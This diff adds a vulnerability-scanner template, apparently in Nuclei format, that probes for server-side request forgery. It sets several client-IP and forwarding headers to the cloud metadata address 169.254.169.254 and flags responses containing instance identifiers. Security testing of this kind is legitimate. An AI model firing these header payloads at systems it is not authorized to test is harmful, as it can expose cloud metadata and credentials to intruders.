@@ -1,0 +1,31 @@
+id: m7-ssrf-header-injection
+info:
+  name: M7 - SSRF via HTTP Header Injection
+  author: Sharlix
+  severity: high
+  description: Tests SSRF via Host header, X-Forwarded-For and other injection points
+  tags: ssrf,headers,host-header,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      X-Forwarded-For: "http://169.254.169.254"
+      X-Real-IP: "169.254.169.254"
+      X-Custom-IP-Authorization: "169.254.169.254"
+      True-Client-IP: "169.254.169.254"
+      Client-IP: "169.254.169.254"
+      Forwarded: "for=169.254.169.254"
+      X-ProxyUser-Ip: "169.254.169.254"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "169.254.169.254"
+        part: body
+        condition: or
